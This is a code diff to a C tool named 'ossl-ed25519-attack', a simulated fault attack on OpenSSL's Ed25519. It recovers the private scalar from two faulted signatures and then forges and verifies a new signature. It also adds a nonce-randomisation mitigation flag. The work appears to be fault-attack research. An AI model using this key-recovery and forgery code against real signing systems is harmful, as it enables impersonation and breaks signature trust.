@@ -7,18 +7,31 @@
 #include "openssl/evp.h"
 #include "openssl/err.h"
 #include "openssl/sha.h"
+#include "openssl/rand.h"
 
 #include "pretty_print.h"
+#include "flags.h"
 
 
 #define SIGN_RUNS 2
+
+#define ARGFLAG_MIT_RAND 	0x80
+#define ARGFLAG_VERBOSE		'v'
+#define ARGFLAG_NO_COLOR	'p'
+
+// Globals
+int mit_rand = 0;
 
 // Configure argp
 const char *argp_program_version = "ossl-ed25519-attack 1.0";
 static char doc[] = "A simulated fault attack on OpenSSL Ed25519";
 static struct argp_option options[] = {
-	{"verbose", 'v', 0, 0, "Produce verbose output"},
-	{"no-color", 'p', 0, 0, "Produce plain output without colors"},
+	{0,0,0,0, "Mitigations:"},
+	{"mit-rand", ARGFLAG_MIT_RAND, 0, 0, "Add randomness to nonce"},
+
+	{0,0,0,0, "Output:"},
+	{"verbose", ARGFLAG_VERBOSE, 0, 0, "Produce verbose output"},
+	{"no-color", ARGFLAG_NO_COLOR, 0, 0, "Produce plain output without colors"},
 	{0}
 };
 static int parse_opt (int key, char *arg, struct argp_state *state);
@@ -26,21 +39,36 @@ static struct argp argp = {options, parse_opt, 0, doc};
 
 static uint8_t kmsg[] 					= {1, 2, 3, 4};
 static const uint8_t kmsg_original[] 	= {1, 2, 3, 4};
+static const uint8_t test_msg[] 		= "JMP ESP";
 uint8_t sig[SIGN_RUNS][64];
 
 // Function declarations
 int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len);
 int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t s2);
+int verify_ossl(const uint8_t sig[64], const uint8_t public_key[32], const uint8_t *m, const int m_len);
+
+// Ed25519 function imports from openssl/crypto/ec/curve25519.c (patched)
+typedef int32_t fe[10];
+typedef struct {
+	fe X;
+	fe Y;
+	fe Z;
+	fe T;
+} ge_p3;
+extern void ge_scalarmult_base(ge_p3 *h, const uint8_t *a);
+extern void ge_p3_tobytes(uint8_t *s, const ge_p3 *h);
 
 // Parse a single option (argp)
 static int parse_opt (int key, char *arg, struct argp_state *state)
 {	
 	switch (key)
 	{
-	case 'v':
+	case ARGFLAG_MIT_RAND:
+		mit_rand = 1;
+	case ARGFLAG_VERBOSE:
 		pp_verbose = 1;
 		break;
-	case 'p':
+	case ARGFLAG_NO_COLOR:
 		pp_color = 0;
 	
 	default:
@@ -62,9 +90,10 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t
 	pretty_print_v_mpz("s1 =", s1);
 	pretty_print_v_mpz("s2 =", s2);
 
+	mpz_t h1, h2, h, s, nr, nR, tmp, l;
+	mpz_inits(h1, h2, h, s, nr, nR, tmp, l, NULL);
+
 	// Compute hashes h1, h2
-	mpz_t h1, h2, h, s, tmp, l;
-	mpz_inits(h1, h2, h, s, tmp, l, NULL);
 	if (!sha512(h1, R, A, kmsg_original, sizeof(kmsg_original))
 		|| !sha512(h2, R, A, kmsg, sizeof(kmsg))) {
 		pretty_print_text_col("Error computing hashes!", PP_COL_RED);
@@ -98,33 +127,94 @@ int recover_a(mpz_t a, const mpz_t A, const mpz_t R, const mpz_t s1, const mpz_t
 
 	pretty_print_v_mpz("a =", a);
 
-	// Recreate signatures
+	// Recreate signature to check if a is correct
 	pretty_print_v_text("Checking a:");
-	// r = s - H()*a
+	// Choose random r and generate R accordingly
+	uint8_t a_r[64], a_R[32];
+	RAND_bytes(a_r, sizeof(a_r));
+	mpz_import(nr, sizeof(a_r), -1, sizeof(uint8_t), 0, 0, a_r);
+	mpz_mod(nr, nr, l);
+	pretty_print_v_mpz("New r =", nr);
+
+	// Calculate R = rB
+	mpz_export(a_r, NULL, -1, sizeof(uint8_t), 0, 0, nr);
+	{
+		// Use functions from openssl/crypto/ec/curve25519.c
+		ge_p3 ge_R;
+		ge_scalarmult_base(&ge_R, a_r);
+		ge_p3_tobytes(a_R, &ge_R);
+	}
+	mpz_import(nR, sizeof(a_R), -1, sizeof(uint8_t), 0, 0, a_R);
+	pretty_print_v_mpz("New R =", nR);
+
+	// h1 = H(nR, A, test_msg)
+	if (!sha512(h1, nR, A, test_msg, sizeof(test_msg))) {
+		pretty_print_text_col("Error computing new hash!", PP_COL_RED);
+		goto err;
+	}
+
+	// s = (nr + h1*a) mod l
 	mpz_mul(h, h1, a);
 	mpz_mod(h, h, l);
-	mpz_sub(tmp, s1, h);
-	mpz_mod(tmp, tmp, l);
+	mpz_add(s, nr, h);
+	mpz_mod(s, s, l);
+	pretty_print_v_mpz("s =", s);
 
-	// s = (r + H()*a) mod l
-	mpz_add(tmp, tmp, h);
-	mpz_mod(tmp, tmp, l);
+	// Verify newly generated signature
+	int ret;
+	uint8_t sig[64];
+	uint8_t a_A[32];
+	mpz_export(sig, NULL, -1, sizeof(uint8_t), 0, 0, nR);
+	mpz_export(sig + 32, NULL, -1, sizeof(uint8_t), 0, 0, s);
+	mpz_export(a_A, NULL, -1, sizeof(uint8_t), 0, 0, A);
 
-	if (mpz_cmp(s1, tmp) == 0)
-		pretty_print_text_col("Secret a successfully recovered.", PP_COL_GREEN);
+	ret = verify_ossl(sig, a_A, test_msg, sizeof(test_msg));
+	if (ret == 1)
+		pretty_print_text_col("Signature successfully forged.", PP_COL_GREEN);
+	else if (ret == 0)
+		pretty_print_text_col("Signature could not be forged.", PP_COL_RED);
 	else
-		pretty_print_text_col("Could not recreate signature.", PP_COL_RED);
+		goto err;
 
-	mpz_clears(h1, h2, h, s, tmp, l, NULL);
+	mpz_clears(h1, h2, h, s, nr, nR, tmp, l, NULL);
 	pretty_print_cfg_rm();
 	return 1;
 
 err:
-	mpz_clears(h1, h2, h, s, tmp, l, NULL);
+	mpz_clears(h1, h2, h, s, nr, nR, tmp, l, NULL);
+	ERR_print_errors_fp(stderr);
 	pretty_print_cfg_rm();
 	return 0;
 }
 
+int verify_ossl(const uint8_t sig[64], const uint8_t public_key[32], const uint8_t *m, const int m_len)
+{
+	pretty_print_cfg("[ATCK] {ossl_ed25519_attack.c:verify_ossl()}");
+
+	int ret;
+	EVP_PKEY *pkey = NULL;
+	EVP_PKEY_CTX *pctx = NULL;
+	EVP_MD_CTX  *mdctx = NULL;
+
+	pctx = EVP_PKEY_CTX_new_id(EVP_PKEY_ED25519, NULL);
+	pkey = EVP_PKEY_new_raw_public_key(EVP_PKEY_ED25519, NULL, public_key, 32);
+
+	mdctx = EVP_MD_CTX_new();
+
+	// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestVerifyInit.html
+	if (!EVP_DigestVerifyInit(mdctx, &pctx, NULL, NULL, pkey))
+		goto err;
+	ret = EVP_DigestVerify(mdctx, sig, 64, m, m_len);
+
+err:
+	EVP_MD_CTX_free(mdctx);
+	pretty_print_cfg_rm();
+	return ret;
+}
+
+/**
+ * h = SHA512(R, A, m)
+ */
 int sha512(mpz_t h, const mpz_t R, const mpz_t A, const uint8_t *m, const int m_len) 
 {
 	// Configure pretty print
@@ -224,10 +314,7 @@ int main(int arc, char *argv[])
 		pretty_print("    s =", sig[sign_run] + sig_len/2, sig_len/2);
 
 		// Check signature
-		// Doc: https://www.openssl.org/docs/man1.1.1/man3/EVP_DigestVerifyInit.html
-		if (!EVP_DigestVerifyInit(mdctx, &pctx, NULL, NULL, pkey))
-			goto err;
-		ret = EVP_DigestVerify(mdctx, sig[sign_run], sig_len, kmsg_original, sizeof(kmsg_original));
+		ret = verify_ossl(sig[sign_run], pub, kmsg_original, sizeof(kmsg_original));
 		if (ret == 1)
 			pretty_print_text_col("Signature successfully verified.", PP_COL_GREEN);
 		else if (ret == 0)
